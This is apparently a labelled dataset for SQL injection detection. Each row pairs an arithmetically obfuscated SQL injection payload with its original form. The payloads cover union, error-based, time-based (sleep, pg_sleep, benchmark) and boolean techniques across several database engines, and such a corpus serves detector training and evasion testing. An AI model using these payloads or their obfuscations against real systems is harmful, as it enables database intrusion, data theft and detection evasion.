,Query,Label,Original
9787,1   )    )    as beld where  2/2-1+8-8+1679+SIN(0)+0+2*3-6=2*3-6+8-8+1679+2*3-6+0 or 2/2-1 Or SIN(0) || sleep  (  5  )  # ,1,1   )    )    as beld where 1679  =  1679 or sleep  (  5  )  #
9788,1  )   AND 1 AND  2/2-1+SIN(0)+2/2-1+4386+8-8+SIN(0)=0+2/2-1+2*3-6+SIN(0)+utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  Or SIN(0) oR  (  select   (  case when   (   2/2-1+SIN(0)+4386+2/2-1=0+4386+2/2-1+8-8+2/2-1  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )  ,1,1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) 
9789,"1  )   aND 1 and  SIN(0)+2*3-6+8514+2*3-6+2/2-1+8-8=(+0+SIN(0)  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   ",1,"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  "
9790,"1'   )    )     )   Or 2*3-6 Or 2/2-1 OR  2/2-1+2/2-1+9643+SIN(0)+2/2-1=2*3-6+8-8+(+SIN(0)  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 1 aNd 1 aND    (    (     (  'phdn' like 'phdn ",1,"1'   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'phdn' like 'phdn"
9791,"1   )    )     )   union all select null,null,null,null,null# ",1,"1   )    )     )   union all select null,null,null,null,null#"
9792,"1%'  )   aNd 1 aNd exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (   8-8+2*3-6+8190+2*3-6=SIN(0)+SIN(0)+8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (   2/2-1+'%'+8-8=0+2/2-1+0+'+2/2-1 ",1,"1%'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  '%'  =  '"
9793,"-4983% ""  )   oR 8-8 Or 0 || 0 ||  4747+2*3-6+2/2-1=2/2-1+2*3-6+dbms_utility.sqlid_to_sqlhash+2/2-1   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (   SIN(0)+SIN(0)+4747+8-8=8-8+2*3-6+4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 1 And   (   ""% "" +2*3-6+0=8-8+0++0 "" ",1,"-4983%""  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """
9794,"1% "" union all select null,null-- ",1,"1%"" union all select null,null--"
9795,"1'+  (  select 'swxi' where  7651+0+SIN(0)=8-8+0+7651+2*3-6+2/2-1 AND 1 And  6414+0+2/2-1=(+SIN(0)+2*3-6  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +' ",1,"1'+  (  select 'swxi' where 7651  =  7651 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'"
9796,"1%' OR SIN(0) OR 0 OR  SIN(0)+8156+SIN(0)+8-8=SIN(0)+0+2*3-6+2/2-1+(+2*3-6  select count  (  *  )   from generate_series  (  1,5000000   )    )   -- ",1,"1%' or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"
9797,-6145 or 0 OR   (   0+2*3-6+SIN(0)+8459+2/2-1+2*3-6=2*3-6+SIN(0)+8459+8-8  )  *4906-- yklv ,1,-6145 or   (  8459  =  8459  )  *4906-- yklv
9798,-6178   )    )    as lygb where  2/2-1+9559+2*3-6=0+SIN(0)+9559+0+2*3-6+SIN(0) or 8-8 or   (   8-8+0+SIN(0)+8459+2/2-1=0+2*3-6+8459  )  *4906-- ,1,-6178   )    )    as lygb where 9559  =  9559 or   (  8459  =  8459  )  *4906--
9799,"1 ""  )   as ikdo where  8-8+2/2-1+4128+2/2-1+8-8=2*3-6+2/2-1+4128 ",1,"1""  )   as ikdo where 4128  =  4128"
9800,1  )   where  2*3-6+8-8+6150=6150+2/2-1+2*3-6 ,1,1  )   where 6150  =  6150
9801,1'  )   OR 8-8 OR  2/2-1+0+4240+SIN(0)=2*3-6+0+8-8+2/2-1+(+2/2-1  select 4240 from pg_sleep  (  5   )    )   -- ,1,1'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
9802,1  )   AND 1 And  8594+2/2-1+2*3-6=SIN(0)+8-8+SIN(0)+(+0+2*3-6  select 8594 from pg_sleep  (  5   )    )   -- ,1,1  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
9803,1' where  2*3-6+6409+8-8=2*3-6+8-8+6409+2/2-1+2/2-1 ,1,1' where 6409  =  6409
9804,"-4346'  )   OR 0 OR 1 group by concat  (  0x7171706a71,  (  select   (  case when   (   2/2-1+SIN(0)+2*3-6+4232=SIN(0)+SIN(0)+4232+2*3-6+2/2-1+2*3-6  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  # ",1,"-4346'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #"
9805,1 where  2*3-6+0+4003+8-8=2/2-1+4003+SIN(0)+SIN(0) union all select null-- ,1,1 where 4003  =  4003 union all select null--
9806,"1 ""  )   AND 1 and 1 And  SIN(0)+8148+2*3-6=0+like+0+SIN(0)+8-8+2/2-1  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- ",1,"1""  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --"
9807,1  )   where  0+2/2-1+1929+8-8=SIN(0)+SIN(0)+2*3-6+1929+0 aND 1 And   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ,1,1  )   where 1929  =  1929 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --
9808,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual AND 1 And 1 and    (    (     (  'knbx' like 'knbx ",1,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  'knbx' like 'knbx"
9809,"1  )   as cfnz where  2/2-1+6065+2*3-6=2/2-1+6065+2/2-1+SIN(0) union all select null,null,null,null,null,null,null,null,null# ",1,"1  )   as cfnz where 6065  =  6065 union all select null,null,null,null,null,null,null,null,null#"
9810,"1   )    )    as henn where  SIN(0)+9980+2*3-6=2/2-1+0+9980+SIN(0)+2*3-6 or SIN(0) OR 0 or 0 OR  SIN(0)+2/2-1+8-8+2*3-6+4915+2/2-1=SIN(0)+(+8-8+0  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  -- ",1,"1   )    )    as henn where 9980  =  9980 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --"
9811,"1'  )   where  SIN(0)+3375+2*3-6+2/2-1+2*3-6=2/2-1+0+2*3-6+3375+2*3-6 OR 8-8 or 2/2-1 Or 2*3-6 oR  2*3-6+2*3-6+8315+2*3-6=0+0+SIN(0)+8-8+(+2/2-1  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  -- ",1,"1'  )   where 3375  =  3375 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --"
9812,"1'||  (  select 'akye' where  0+9242+SIN(0)+8-8+0=0+9242+2/2-1 union all select null,null,null,null,null,null# ",1,"1'||  (  select 'akye' where 9242  =  9242 union all select null,null,null,null,null,null#"
9813,"1 "" where  SIN(0)+2235+2*3-6+SIN(0)=2*3-6+8-8+2235+2*3-6+2/2-1 union all select null,null,null,null,null-- ",1,"1"" where 2235  =  2235 union all select null,null,null,null,null--"
9814,"1 ""   )    )    || 0 OR SIN(0) or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (   8-8+8-8+9173+SIN(0)+8-8=SIN(0)+2/2-1+9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 1 aND    (    (    ""tfso "" 2/2-1+0+=8-8++0+8-8+8-8 ""tfso ",1,"1""   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""tfso""  =  ""tfso"
9815,-6086'   )    )    or 2/2-1 OR   (   2/2-1+6719+2/2-1+0=0+7280+8-8+2*3-6+2*3-6  )  *7280 and 1 aNd    (    (    8-8+2/2-1+SIN(0)+'ozbj'+SIN(0)+2/2-1=2*3-6+8-8+2*3-6+'ozbj+0+0 ,1,-6086'   )    )    or   (  6719  =  7280  )  *7280 and    (    (   'ozbj'  =  'ozbj
9816,"1 where  2146+2/2-1+2/2-1=2*3-6+2146+2/2-1+8-8+2/2-1+SIN(0) OR 8-8 Or 8-8 OR  SIN(0)+8384+SIN(0)=like+SIN(0)+0  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- ",1,"1 where 2146  =  2146 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --"
9817,"1 aND 1 aND 1 aND  SIN(0)+0+3202+0=SIN(0)+2*3-6+2*3-6+like+8-8+8-8  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # qmkh ",1,"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # qmkh"
9818,1%'   )    )    And 1 and 1 And  8-8+2853+2/2-1+SIN(0)=2/2-1+cast+0+2*3-6+8-8   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   or SIN(0) or  (  select   (  case when   (   2/2-1+0+2853+8-8=2*3-6+8-8+2853+2/2-1  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (    0+'%'+0=SIN(0)+SIN(0)+'+2/2-1+SIN(0) ,1,1%'   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   '%'  =  '
9819,"1  )   as kjsd where  1670+0+SIN(0)+SIN(0)=SIN(0)+1670+0 Or 8-8 OR 0 OR  1022+0+8-8=8-8+(+8-8  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- ",1,"1  )   as kjsd where 1670  =  1670 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"
9820,"-2987 ""  )   as iyob where  SIN(0)+2*3-6+7827+8-8+2*3-6+2*3-6=0+7827+2/2-1+8-8 Or 2*3-6 Or 2/2-1 Or 2*3-6 ||   (   2*3-6+2*3-6+2*3-6+8459+8-8=0+2*3-6+8-8+2/2-1+8459+SIN(0)  )  *4906-- ",1,"-2987""  )   as iyob where 7827  =  7827 or   (  8459  =  8459  )  *4906--"
9821,"-6368   )    )    union all select 4646,4646,4646,4646,4646,4646,4646-- ",1,"-6368   )    )    union all select 4646,4646,4646,4646,4646,4646,4646--"
9822,-6947'   )    )    as qqjp where  0+2/2-1+6700+8-8+SIN(0)=SIN(0)+6700+2/2-1+2*3-6+2/2-1 union all select 6700# ,1,-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#
9823,-2604   )    )    as sekb where  SIN(0)+8-8+6897+0=SIN(0)+SIN(0)+6897+SIN(0)+0 or 0 Or 2*3-6 OR  2/2-1+8-8+1000+2/2-1=8-8+0+7683+SIN(0)+SIN(0) ,1,-2604   )    )    as sekb where 6897  =  6897 or 1000  =  7683
9824,"1 "" union all select null,null,null,null,null,null,null,null,null,null-- ",1,"1"" union all select null,null,null,null,null,null,null,null,null,null--"
9825,1'   )    )     )   rlike   (  select   (  case when   (   8-8+SIN(0)+4076+2/2-1=SIN(0)+0+4881+SIN(0)+2/2-1+8-8  )   then 1 else 0x28 end   )    )    and 1 aND 1 &&    (    (     (   0+0+'grzs'+0+8-8=2*3-6+2*3-6+'grzs+2/2-1+0+2*3-6 ,1,1'   )    )     )   rlike   (  select   (  case when   (  4076  =  4881  )   then 1 else 0x28 end   )    )    and    (    (     (  'grzs'  =  'grzs
9826,-2751 where  2/2-1+6334+0=SIN(0)+6334+SIN(0) Or 0 OR 2/2-1 Or 2*3-6 or   (   2*3-6+9668+SIN(0)+SIN(0)+SIN(0)=2*3-6+SIN(0)+0+5845+2/2-1  )  *5845-- ,1,-2751 where 6334  =  6334 or   (  9668  =  5845  )  *5845--
9827,1'+  (  select 'rejz' where  0+8-8+1530+SIN(0)+0+2*3-6=2*3-6+8-8+1530+2/2-1+SIN(0)+SIN(0) aND 1 aNd  2/2-1+2/2-1+7756+0+2/2-1+2*3-6=SIN(0)+0+dbms_utility.sqlid_to_sqlhash+2/2-1+2/2-1   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  OR 2*3-6 ||  (  select   (  case when   (   8-8+0+2*3-6+0+7756+2*3-6=SIN(0)+SIN(0)+7756+0  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +' ,1,1'+  (  select 'rejz' where 1530  =  1530 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'
9828,1'   )    )    as jbcd where  9078+8-8+SIN(0)=2/2-1+8-8+9078+2/2-1 and 1 and  6969+0+2/2-1+0+0=8-8+(+SIN(0)+SIN(0)+0  select 6969 from pg_sleep  (  5   )    )   -- ,1,1'   )    )    as jbcd where 9078  =  9078 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
9829,"1  )   AND 1 aND updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (   2*3-6+2/2-1+3393+2/2-1+0+2/2-1=3393,1+SIN(0)+2*3-6+2/2-1   )    )     )  ,0x717a767a71  )  ,1161  )   ",1,"1  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  "
9830,"select count  (  *  )   from generate_series  (  1,5000000  )   and 1 and 1 And   (   8-8+8-8+'qpdu'+0+2*3-6=0+2*3-6+'qpdu+2*3-6 ",1,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'qpdu'  =  'qpdu"
9831,"1%'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   And 1 AND   (   SIN(0)+2*3-6+2/2-1+8-8+'%'+8-8=0+'+SIN(0) ",1,"1%'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  '%'  =  '"
9832,-3246%' union all select 4012# ,1,-3246%' union all select 4012#
9833,"1 ""   )    )     (  select   (  case when   (   8-8+8-8+5451+2*3-6+SIN(0)=8-8+2*3-6+5451+8-8+SIN(0)+8-8  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   And 1 And    (    (    ""rfam "" like  ""rfam ",1,"1""   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   ""rfam"" like ""rfam"
9834,"1'+  (  select dnxi where  0+5850+2*3-6+2*3-6+2*3-6+2*3-6=8-8+5850+8-8+8-8 or 2/2-1 Or SIN(0) || 0 OR  8156+2/2-1+8-8+0=0+8-8+2/2-1+(+SIN(0)+SIN(0)  select count  (  *  )   from generate_series  (  1,5000000   )    )   -- ",1,"1'+  (  select dnxi where 5850  =  5850 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"
9835,-6353%'   )    )    Or 0 OR  0+3440+8-8=2*3-6+2*3-6+2/2-1+cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   oR 8-8 oR  (  select   (  case when   (   0+3440+0=2/2-1+0+0+3440+2/2-1  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   aND 1 aND    (    (    '%'+SIN(0)+0+2/2-1=8-8+0+'+8-8+8-8 ,1,-6353%'   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   '%'  =  '
9836,"1'+  (  select 'tyuz' where  SIN(0)+8-8+3957+SIN(0)=0+3957+SIN(0)+8-8 Or 2/2-1 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85   SIN(0)+SIN(0)+8-8+8-8+)+SIN(0)=2/2-1+SIN(0)+regexp_substring+2/2-1+8-8  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +' ",1,"1'+  (  select 'tyuz' where 3957  =  3957 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'"
9837,"1 "" where  SIN(0)+SIN(0)+9461+2*3-6+8-8+2/2-1=8-8+2/2-1+2*3-6+9461+0+2/2-1 ",1,"1"" where 9461  =  9461"
9838,"-9163 "" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820# ",1,"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#"
9839,"1'   )    )    aNd 1 And  SIN(0)+SIN(0)+2*3-6+3202+0=2*3-6+2/2-1+like+0  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (    8-8+'qgdv'+2/2-1='qgdv+SIN(0)+2/2-1 ",1,"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'qgdv'  =  'qgdv"
9840,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  +' ",1,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  +'"
9841,1'   )    )    as txxn where  2*3-6+2/2-1+SIN(0)+8-8+7884+8-8=SIN(0)+SIN(0)+7884+8-8+SIN(0)+8-8 AND 1 And 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (   2*3-6+2*3-6+SIN(0)+3715+8-8+SIN(0)=2/2-1+0+2/2-1+3715+2/2-1+8-8  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- ,1,1'   )    )    as txxn where 7884  =  7884 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --
9842,1 where  2/2-1+8-8+6173+0+SIN(0)=2/2-1+0+SIN(0)+SIN(0)+2/2-1+6173 ,1,1 where 6173  =  6173
9843,"1 where  6383+2*3-6+SIN(0)=0+6383+2*3-6+2/2-1 || SIN(0) || SIN(0) or elt  (   0+2*3-6+2/2-1+6272+8-8+8-8=2/2-1+0+6272,sleep+SIN(0)+8-8+8-8  (  5   )    )   -- ",1,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --"
9844,"1% "" and 1 aNd char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85   2/2-1+8-8+)+2*3-6+8-8=regexp_substring+2/2-1+2*3-6  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and  ""% "" 8-8+2*3-6+2*3-6++2*3-6+0=2/2-1+0+2*3-6+ "" ",1,"1%"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""%""  =  """
9845,"1' where  8-8+SIN(0)+8-8+7504+2/2-1=8-8+8-8+7504+8-8+SIN(0) and 1 and 1 aNd char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85   2*3-6+8-8+0+)+8-8=regexp_substring+2/2-1+0  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  -- ",1,"1' where 7504  =  7504 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --"
9846,select   (  case when   (   2*3-6+2/2-1+4297+SIN(0)+2/2-1+2*3-6=2/2-1+9086+2/2-1+8-8+2*3-6  )   then 4297 else 1/  (  select 0  )   end  )  -- ,1,select   (  case when   (  4297  =  9086  )   then 4297 else 1/  (  select 0  )   end  )  --
9847,"1'  )   Or 0 oR 2*3-6 ||  0+0+5286=0+8-8+8-8+(+2*3-6+2/2-1  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 1 aND 1 And   (   2*3-6+'cqrp'+0=SIN(0)+'cqrp+0+2/2-1+0 ",1,"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'cqrp'  =  'cqrp"
9848,"1 ""  )   as eomu where  2/2-1+SIN(0)+6599=2/2-1+6599+2/2-1+0+8-8 ",1,"1""  )   as eomu where 6599  =  6599"
9849,1'+  (  select 'wyed' where  9896+SIN(0)+SIN(0)=SIN(0)+0+0+9896+SIN(0) ,1,1'+  (  select 'wyed' where 9896  =  9896
9850,"1'+  (  select oogh where  2/2-1+2*3-6+2*3-6+8-8+SIN(0)+1167=2*3-6+8-8+8-8+0+1167 OR SIN(0) Or elt  (   SIN(0)+5873+8-8+8-8=2/2-1+SIN(0)+0+5873,sleep+0+8-8  (  5   )    )   # ",1,"1'+  (  select oogh where 1167  =  1167 or elt  (  5873  =  5873,sleep  (  5   )    )   #"
9851,"-8982'+  (  select anyd where  5358+0+SIN(0)+2*3-6+SIN(0)=8-8+2/2-1+5358 union all select 5358,5358,5358,5358,5358,5358# ",1,"-8982'+  (  select anyd where 5358  =  5358 union all select 5358,5358,5358,5358,5358,5358#"
9852,"1'+  (  select jrmz where  4762+2/2-1+SIN(0)=2/2-1+2*3-6+4762 aND 1 aNd elt  (   0+9588+2*3-6+SIN(0)=2*3-6+0+2*3-6+9794,9794+8-8+8-8   )    )   +' ",1,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'"
9853,"1 ""   )    )    union all select null# ",1,"1""   )    )    union all select null#"
9854,"-2263'  )   where  2/2-1+7931+2*3-6+0+SIN(0)=0+8-8+7931 union all select 7931,7931,7931-- ",1,"-2263'  )   where 7931  =  7931 union all select 7931,7931,7931--"
9855,-5585%'   )    )     )   Or 0 or 0 Or  2/2-1+2/2-1+8-8+6990+8-8+SIN(0)=7727+SIN(0)+SIN(0)+8-8 ,1,-5585%'   )    )     )   or 6990  =  7727
9856,-2300  )   OR SIN(0) || 2/2-1 ||  4747+2/2-1+8-8=dbms_utility.sqlid_to_sqlhash+0+8-8   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (   2/2-1+8-8+4747+0+2*3-6=2/2-1+8-8+2/2-1+4747+2/2-1+0  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ,1,-2300  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) 
